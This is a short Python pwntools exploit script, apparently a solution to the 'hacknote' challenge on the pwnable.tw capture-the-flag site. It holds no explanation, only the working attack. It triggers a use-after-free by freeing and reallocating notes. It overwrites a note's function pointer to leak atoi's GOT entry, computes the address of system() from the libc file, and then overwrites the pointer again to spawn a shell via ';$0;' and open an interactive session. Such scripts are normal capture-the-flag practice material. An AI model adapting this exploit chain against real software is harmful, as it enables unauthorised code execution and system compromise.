from pwn import *
context(log_level = "debug")
t = remote('chall.pwnable.tw', 10102)
#t = process("./hacknote")
elf = ELF("./hacknote")
def add_note(size,context):
	t.recvuntil("Your choice :")
	t.sendline('1')
	t.recvuntil("Note size :")
	t.sendline(str(size))
	t.recvuntil("Content :")
	t.sendline(context)



def delete_note(index):
	t.recvuntil("Your choice :")
	t.sendline("2")
	t.recvuntil("Index :")
	t.sendline(index)


def print_note(index):
	t.recvuntil("Your choice :")
	t.sendline("3")
	t.recvuntil("Index :")
	t.sendline(index)

raw_input()

got_atoi = elf.got['atoi']
plt_puts = elf.symbols['puts']

add_note(20,"aaaa") #0
add_note(20,"bbbb") #1
delete_note("1")    
delete_note("0")
add_note(8,p32(0x0804862B)+p32(got_atoi)) #2
print_note("1")
addr_atoi = u32(t.recv(4))

libc = ELF("./libc_32.so.6")
addr_system = addr_atoi - libc.symbols['atoi'] + libc.symbols['system']
delete_note("2")
add_note(8,p32(addr_system)+";$0;")
print_note("1")
t.interactive()




#0x804893d


